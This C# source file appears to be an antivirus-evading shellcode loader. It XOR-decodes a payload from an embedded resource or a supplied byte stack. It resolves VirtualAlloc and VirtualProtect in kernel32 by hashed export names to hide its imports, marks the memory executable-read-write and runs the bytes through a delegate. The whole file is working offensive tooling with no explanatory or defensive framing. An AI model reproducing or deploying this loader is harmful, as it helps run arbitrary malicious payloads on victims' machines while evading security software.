using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace NETDelegate
{
    class Execute
    {
        public static byte[] mybytearr;
        public static void exec ()
        {
            if (GetCode.UseRaw == true)
            {
                mybytearr = GetEmbeddedBin(GetCode.ResName);
                for (int i = 0; i < mybytearr.Length; i++)
                {
                    mybytearr[i] ^= 0x4e;
                    mybytearr[i] ^= 0x2e;

                }
            }
            else
            {
                Stack<byte> recvStack = GetCode.CodeStack();
                mybytearr = new byte[recvStack.Count];
                int mybytearrLen = recvStack.Count;
                for (int i = 0; i <= mybytearrLen; i++)
                {
                    try
                    {
                        mybytearr[i] = recvStack.Pop();
                    }
                    catch { break; }

                }
            }

            //3d4f0f8e
            IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
            IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
            FuckAlloc FuckAlloc = (FuckAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(FuckAlloc));
            IntPtr addr = FuckAlloc(0, mybytearr.Length, 0x1000, 0x04);
            Marshal.Copy(mybytearr, 0, addr, mybytearr.Length);
            uint word;
            MYVIRTULProtect(addr, (UIntPtr)mybytearr.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE,out word);
            EXEC mydel = (EXEC)Marshal.GetDelegateForFunctionPointer(addr, typeof(EXEC));
            mydel();

        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr FuckAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);

        [UnmanagedFunctionPointerAttribute(CallingConvention.StdCall)]
        public delegate Int32 EXEC();

        public static bool MYVIRTULProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr vppointer = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), @"ad9f9cd0");
            MYVirtualProtect mytirtualProtect = (MYVirtualProtect)Marshal.GetDelegateForFunctionPointer(vppointer, typeof(MYVirtualProtect));
            return mytirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);

        }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MYVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
        public static byte[] GetEmbeddedBin(string resourcesName)
        {

            var EmbeddedRes = Assembly.GetExecutingAssembly();
            using (var rs = EmbeddedRes.GetManifestResourceStream(resourcesName))
            {
                if (rs != null)
                {
                    using (var ms = new MemoryStream())
                    {
                        rs.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
                else
                {
                    return null;
                }

            }
        }
    }
}
